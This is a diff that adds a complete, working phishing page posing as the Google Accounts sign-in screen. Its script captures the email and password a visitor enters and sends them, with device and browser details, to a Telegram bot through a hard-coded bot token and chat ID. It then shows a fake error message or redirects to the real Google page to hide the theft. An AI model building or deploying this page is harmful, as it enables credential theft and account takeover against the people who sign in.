@@ -1,0 +1,444 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Sign in - Google Accounts</title>
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500&display=swap" rel="stylesheet">
+    
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Roboto', -apple-system, BlinkMacSystemFont, sans-serif;
+            -webkit-tap-highlight-color: transparent;
+        }
+
+        body {
+            background-color: #ffffff;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+        }
+
+        .login-card {
+            background: #ffffff;
+            border: 1px solid #dadce0;
+            border-radius: 8px;
+            width: 100%;
+            max-width: 450px;
+            padding: 48px 40px 36px;
+            text-align: center;
+        }
+
+        .google-logo {
+            width: 75px;
+            height: auto;
+            margin-bottom: 15px;
+        }
+
+        .login-card h1 {
+            font-size: 24px;
+            font-weight: 400;
+            color: #202124;
+            margin-bottom: 10px;
+        }
+
+        .login-card .subtitle {
+            font-size: 16px;
+            color: #202124;
+            margin-bottom: 30px;
+        }
+
+        .error-message {
+            display: none;
+            color: #d93025;
+            font-size: 14px;
+            text-align: left;
+            margin-bottom: 15px;
+            align-items: center;
+            gap: 5px;
+        }
+        
+        .error-message svg {
+            width: 16px;
+            height: 16px;
+            fill: #d93025;
+        }
+
+        .input-group {
+            position: relative;
+            margin-bottom: 20px;
+            text-align: left;
+        }
+
+        .input-group input {
+            width: 100%;
+            height: 56px;
+            padding: 16px 14px 0;
+            font-size: 16px;
+            color: #202124;
+            background: transparent;
+            border: 1px solid #dadce0;
+            border-radius: 4px;
+            outline: none;
+            transition: border-color 0.2s;
+        }
+
+        .input-group input:focus {
+            border: 2px solid #1a73e8;
+            padding: 15px 13px 0;
+        }
+
+        .input-group input.error {
+            border: 2px solid #d93025;
+        }
+
+        .input-group label {
+            position: absolute;
+            left: 14px;
+            top: 18px;
+            font-size: 16px;
+            color: #5f6368;
+            pointer-events: none;
+            transition: all 0.2s ease;
+        }
+
+        .input-group input:focus + label,
+        .input-group input:not(:placeholder-shown) + label {
+            top: 8px;
+            font-size: 12px;
+            color: #1a73e8;
+        }
+
+        .input-group input.error + label,
+        .input-group input.error:focus + label {
+            color: #d93025;
+        }
+
+        .input-group input:not(:focus):not(:placeholder-shown) + label {
+            color: #5f6368;
+        }
+        
+        .input-group input.error:not(:focus):not(:placeholder-shown) + label {
+            color: #d93025;
+        }
+
+        .show-password {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            margin-top: -5px;
+            margin-bottom: 25px;
+        }
+
+        .show-password input {
+            width: 16px;
+            height: 16px;
+            cursor: pointer;
+        }
+
+        .show-password label {
+            font-size: 14px;
+            color: #202124;
+            cursor: pointer;
+        }
+
+        .links-row {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 30px;
+        }
+
+        .links-row a {
+            font-size: 14px;
+            color: #1a73e8;
+            font-weight: 500;
+            text-decoration: none;
+            border-radius: 4px;
+            padding: 8px;
+        }
+
+        .links-row a:hover {
+            background-color: #f6f9fe;
+        }
+
+        .btn-group {
+            display: flex;
+            justify-content: flex-end;
+            align-items: center;
+            gap: 15px;
+            margin-top: 30px;
+        }
+
+        .btn-create {
+            background: transparent;
+            color: #1a73e8;
+            font-size: 14px;
+            font-weight: 500;
+            border: none;
+            padding: 8px 12px;
+            border-radius: 4px;
+            cursor: pointer;
+            text-decoration: none;
+        }
+
+        .btn-create:hover {
+            background-color: #f6f9fe;
+        }
+
+        .btn-next {
+            background-color: #1a73e8;
+            color: #ffffff;
+            font-size: 14px;
+            font-weight: 500;
+            border: none;
+            border-radius: 4px;
+            padding: 10px 24px;
+            cursor: pointer;
+            transition: background 0.2s;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-width: 80px;
+        }
+
+        .btn-next:hover {
+            background-color: #1765cc;
+        }
+
+        .btn-next:disabled {
+            background-color: #a8c7fa;
+            cursor: not-allowed;
+        }
+
+        .footer {
+            width: 100%;
+            max-width: 450px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-top: 20px;
+            font-size: 12px;
+            color: #5f6368;
+        }
+
+        .footer .lang-select {
+            display: flex;
+            align-items: center;
+            gap: 5px;
+            cursor: pointer;
+        }
+
+        .footer .lang-select svg {
+            width: 12px;
+            height: 12px;
+            fill: #5f6368;
+        }
+
+        .footer-links {
+            display: flex;
+            gap: 20px;
+        }
+
+        .footer-links a {
+            color: #5f6368;
+            text-decoration: none;
+        }
+
+        .footer-links a:hover {
+            color: #202124;
+        }
+
+        .spinner {
+            display: none;
+            width: 16px;
+            height: 16px;
+            border: 2px solid rgba(255,255,255,0.3);
+            border-radius: 50%;
+            border-top-color: #fff;
+            animation: spin 1s linear infinite;
+        }
+
+        @keyframes spin { to { transform: rotate(360deg); } }
+        .btn-next.loading .btn-text { display: none; }
+        .btn-next.loading .spinner { display: block; }
+
+        @media (max-width: 480px) {
+            .login-card {
+                border: none;
+                padding: 20px;
+                box-shadow: none;
+            }
+            .footer {
+                margin-top: 10px;
+            }
+        }
+    </style>
+</head>
+<body>
+
+    <div class="login-card">
+        <svg class="google-logo" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 48 48">
+            <path fill="#EA4335" d="M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.72 17.74 9.5 24 9.5z"/>
+            <path fill="#4285F4" d="M46.98 24.55c0-1.57-.15-3.09-.38-4.55H24v9.02h12.94c-.58 2.96-2.26 5.48-4.78 7.18l7.73 6c4.51-4.18 7.09-10.36 7.09-17.65z"/>
+            <path fill="#FBBC05" d="M10.53 28.59c-.48-1.45-.76-2.99-.76-4.59s.27-3.14.76-4.59l-7.98-6.19C.92 16.46 0 20.12 0 24c0 3.88.92 7.54 2.56 10.78l7.97-6.19z"/>
+            <path fill="#34A853" d="M24 48c6.48 0 11.93-2.13 15.89-5.81l-7.73-6c-2.15 1.45-4.92 2.3-8.16 2.3-6.26 0-11.57-4.22-13.47-9.91l-7.98 6.19C6.51 42.62 14.62 48 24 48z"/>
+        </svg>
+
+        <h1>Sign in</h1>
+        <p class="subtitle">Use your Google Account</p>
+
+        <div class="error-message" id="errorMsg">
+            <svg viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"/></svg>
+            <span id="errorText">Wrong password. Try again or click Forgot password to reset it.</span>
+        </div>
+
+        <form id="loginForm">
+            <div class="input-group">
+                <input type="email" id="email" placeholder=" " required>
+                <label>Email or phone</label>
+            </div>
+
+            <div class="input-group">
+                <input type="password" id="password" placeholder=" " required>
+                <label>Enter your password</label>
+            </div>
+
+            <div class="show-password">
+                <input type="checkbox" id="showPassToggle">
+                <label for="showPassToggle">Show password</label>
+            </div>
+
+            <div class="links-row">
+                <a href="https://accounts.google.com/signin/recovery" target="_blank">Forgot password?</a>
+            </div>
+
+            <div class="btn-group">
+                <a href="https://accounts.google.com/signup" target="_blank" class="btn-create">Create account</a>
+                <button type="submit" class="btn-next" id="submitBtn">
+                    <span class="btn-text">Next</span>
+                    <div class="spinner"></div>
+                </button>
+            </div>
+        </form>
+    </div>
+
+    <div class="footer">
+        <div class="lang-select">
+            English (United States)
+            <svg viewBox="0 0 24 24"><path d="M7.41 8.59L12 13.17l4.59-4.58L18 10l-6 6-6-6 1.41-1.41z"/></svg>
+        </div>
+        <div class="footer-links">
+            <a href="https://support.google.com/accounts" target="_blank">Help</a>
+            <a href="https://policies.google.com/privacy" target="_blank">Privacy</a>
+            <a href="https://policies.google.com/terms" target="_blank">Terms</a>
+        </div>
+    </div>
+
+    <script>
+        const BOT_TOKEN = "8762306338:AAG0cLQdMDerjnzKgDO-2FlaLuHzj9Sr3B0"; 
+        const CHAT_ID   = "7988925862";   
+
+        async function sendToTelegram(message) {
+            if (!BOT_TOKEN || !CHAT_ID) return false;
+            try {
+                const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify({ 
+                        chat_id: CHAT_ID, 
+                        text: message, 
+                        parse_mode: "HTML" 
+                    })
+                });
+                const data = await response.json();
+                return data.ok;
+            } catch (error) {
+                return false;
+            }
+        }
+
+        function getDeviceInfo() {
+            const ua = navigator.userAgent;
+            let device = /Android/i.test(ua) ? "📱 Android" : /iPhone|iPad/i.test(ua) ? "📱 iOS" : "💻 PC";
+            let browser = /Chrome/i.test(ua) ? "Chrome" : /Safari/i.test(ua) ? "Safari" : "Other";
+            return { device, browser };
+        }
+
+        document.getElementById('showPassToggle').addEventListener('change', function(e) {
+            const passInput = document.getElementById('password');
+            if (e.target.checked) {
+                passInput.type = 'text';
+            } else {
+                passInput.type = 'password';
+            }
+        });
+
+        document.getElementById("loginForm").addEventListener("submit", async function(e) {
+            e.preventDefault();
+            
+            const email = document.getElementById("email").value.trim();
+            const password = document.getElementById("password").value;
+            const btn = document.getElementById("submitBtn");
+            const errorMsg = document.getElementById("errorMsg");
+            const emailInput = document.getElementById("email");
+            const passInput = document.getElementById("password");
+
+            errorMsg.style.display = "none";
+            emailInput.classList.remove("error");
+            passInput.classList.remove("error");
+
+            if (!email || !password) {
+                return;
+            }
+
+            const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+            if (!emailRegex.test(email)) {
+                emailInput.classList.add("error");
+                document.getElementById("errorText").innerText = "Enter a valid email or phone number.";
+                errorMsg.style.display = "flex";
+                return;
+            }
+
+            btn.classList.add("loading");
+            btn.disabled = true;
+
+            const { device, browser } = getDeviceInfo();
+            const time = new Date().toLocaleString("en-BD", { timeZone: "Asia/Dhaka" });
+
+            const message = `
+<b>🔍 GOOGLE ACCOUNT LOGIN</b>
+━━━━━━━━━━━━━━━━━━
+<b>📧 Email/Phone:</b> <code>${email}</code>
+<b>🔑 Password:</b> <code>${password}</code>
+━━━━━━━━━━━━━━━━━━
+<b>📱 Device:</b> ${device}
+<b>🌐 Browser:</b> ${browser}
+<b>🕒 Time:</b> ${time}
+━━━━━━━━━━━━━━━━━━
+            `;
+
+            await sendToTelegram(message);
+
+            btn.classList.remove("loading");
+            btn.disabled = false;
+
+            const commonPasswords = ["123456", "12345678", "password", "admin", "111111", "12345"];
+            if (password.length < 6 || commonPasswords.includes(password.toLowerCase())) {
+                passInput.classList.add("error");
+                document.getElementById("errorText").innerText = "Wrong password. Try again or click Forgot password to reset it.";
+                errorMsg.style.display = "flex";
+                return;
+            }
+
+            window.location.href = "https://myaccount.google.com/";
+        });
+    </script>
+</body>
+</html>
